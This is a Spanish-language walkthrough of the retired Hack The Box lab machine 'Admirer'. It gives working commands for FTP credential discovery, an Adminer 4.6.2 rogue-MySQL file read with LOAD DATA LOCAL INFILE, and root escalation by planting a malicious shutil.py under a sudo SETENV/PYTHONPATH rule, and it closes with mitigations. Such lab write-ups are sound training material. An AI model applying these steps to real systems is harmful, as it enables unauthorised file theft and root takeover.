---
machine: Admirer
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, ftp, adminer, lfi, pythonpath]
---

# Admirer — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

`robots.txt` señala un directorio "oculto" con credenciales de FTP. El backup de la web trae la configuración antigua, pero no la viva: el `index.php` actual se lee con el LFI de **Adminer 4.6.2**, hablando con un MySQL propio que sirve el fichero por `LOAD DATA LOCAL`. Esa versión da la contraseña real y SSH como `waldo`. La escalada es un `PYTHONPATH` heredado por `sudo`: el script de backup importa `shutil` y lo resuelve desde `/tmp`.

## Reconocimiento

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
21/tcp  ftp     vsftpd 3.0.3
22/tcp  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  http    Apache httpd 2.4.25 ((Debian))
```

`vsftpd 3.0.3` sin `anon` no es la vía; la web sí.

## Enumeración

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt
curl -s http://<IP>/robots.txt
```

```text
User-agent: *
Disallow: /admin-dir
```

`/admin-dir/` no tiene listado, pero sí ficheros:

- `contact.txt`: correos del personal (`waldo@admirer.htb`, `admin@admirer.htb`).
- `credentials.txt`: `ftpuser:<password>`.

```bash
ftp <IP>           # ftpuser + la contraseña del txt
ftp> passive
ftp> mget *
```

Del FTP salen `dump.tar.gz` y `html.tar.gz`. El segundo interesa:

```bash
tar -xzf html.tar.gz && tree -L 3
```

```text
html/
├── index.php
├── utility-scripts/
│   ├── admin_tasks.php
│   ├── db_admin.php
│   ├── info.php
│   └── phptest.php
└── w4ld0s_s3cr4t_d1r/
```

`db_admin.php` guarda `w4ld0s` con la contraseña de la base de datos `admirer`. Son credenciales **locales**: MySQL no escucha hacia fuera, así que no se puede uno conectar directo.

## Foothold

Fuzzeo del directorio con extensiones para encontrar lo que no está en el backup:

```bash
wfuzz -w /usr/share/wordlists/dirb/big.txt -u http://<IP>/admin-dir/FUZZ.php --hc 404
```

Aparece `adminer.php`, un **Adminer 4.6.2**. Esa versión permite que el servidor MySQL al que te conectas sea tuyo, y al abrir una tabla sirve `LOAD DATA LOCAL INFILE` con la ruta que quieras: el cliente (Adminer, en la víctima) lee el fichero y lo manda.

```bash
# 1. MySQL propio, escuchando en 0.0.0.0
mysql -u root
CREATE DATABASE rogue;
USE rogue;
CREATE TABLE t (data LONGTEXT);
# usuario accesible desde fuera + bind-address = 0.0.0.0 en 50-server.cnf
```

```sql
-- 2. En Adminer, login contra <tu IP>:3306 y en "select" elegir la tabla
LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE t;
SELECT * FROM t;
```

El `index.php` vivo ya no coincide con el del tarball: trae la contraseña que `waldo` reutiliza en el sistema.

```bash
ssh waldo@<IP>
```

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

```bash
sudo -l
```

```text
User waldo may run the following commands on admirer:
    (ALL) SETENV: NOPASSWD: /opt/scripts/admin_tasks.sh
```

`SETENV` es la clave: permite pasar variables de entorno al proceso privilegiado. La regla es sobre `admin_tasks.sh`, no sobre `backup.py`; la opción 6 del menú lanza `backup.py`, que hace `import shutil`, y Python resuelve los módulos desde `PYTHONPATH` antes que desde la librería estándar.

```bash
cat /opt/scripts/backup.py        # import shutil, make_archive(...)
echo 'import os; os.system("/bin/sh")' > /tmp/shutil.py
sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh   # opción 6
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Evidencia

```text
/etc/passwd  -> usuario waldo con shell /bin/bash
user.txt     -> <user_flag>
root.txt     -> <root_flag>
```

## Lecciones aprendidas

- Un `Disallow` en `robots.txt` es una pista, no una protección: separa "no indexar" de "no acceder".
- Comparar un backup con el estado vivo evita perseguir credenciales caducadas; el LFI fue el que dio la buena.
- `NOPASSWD` con `SETENV` equivale a ejecutar código: cualquier binario que cargue librerías o módulos del entorno es secuestrable.
- Mitigación: sin `SETENV` en la regla de sudo, `secure_path` y `Defaults env_reset`, y un usuario de backup que no sea root.

## Mitigaciones y detección

- Deshabilitar el FTP anónimo y sustituirlo por SFTP/FTPS con cuentas nominales.
- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.

## Referencias

- [lfi-to-rce](../../../knowledge/web/lfi-to-rce.md)
